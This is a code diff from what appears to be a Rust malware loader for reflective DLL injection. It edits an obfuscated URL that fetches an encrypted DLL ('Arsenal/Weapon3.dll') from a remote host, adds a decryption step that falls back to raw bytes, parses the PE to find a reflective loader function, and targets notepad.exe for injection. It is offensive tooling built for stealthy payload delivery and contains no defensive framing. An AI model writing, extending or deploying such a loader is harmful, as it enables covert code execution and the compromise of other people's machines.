@@ -103,12 +103,13 @@ fn main() -> Result<(), anyhow::Error>{
     };
 
 
-    let obfused_url = obfuse!("http://192.168.48.1:8000/ReflectiveDLL.dll");
+    let obfused_url = obfuse!("http://192.168.191.1:8000/Arsenal/Weapon3.dll");
     let url = obfused_url.as_str();
 
 
     let obfused_process = if enabled_debug_privilege {
-        obfuse!("TextInputHost.exe")
+        // obfuse!("TextInputHost.exe")
+        obfuse!("notepad.exe")
     }
     else {
         obfuse!("notepad.exe")
@@ -137,11 +138,19 @@ fn main() -> Result<(), anyhow::Error>{
         return Ok(());
     }
 
-    let dll_bytes = crypto::decrypt(&data)
-    .expect("[ERROR] Failed to decrypt DLL");
+    let dll_data = match crypto::decrypt(&data) {
+        Ok(decrypted) => {
+            debug_println!("[INFO] Decrypted {} bytes", decrypted.len());
+            decrypted
+        }
+        Err(e) => {
+            debug_eprintln!("[WARN] Crypto decrypt failed ({}), using raw bytes", e);
+            data.clone()
+        }
+    };
 
     // ── Parse PE and find target PID via handle enumeration ───────────────
-    let dll = parse_pe::PeFileParser::new(&dll_bytes);
+    let dll = parse_pe::PeFileParser::new(&dll_data);
 
     let func_raw = dll.get_func_raw(rflname).expect("[ERROR] Failed to find yolo function");
     debug_println!("[INFO] yolo raw offset: 0x{:X}", func_raw);
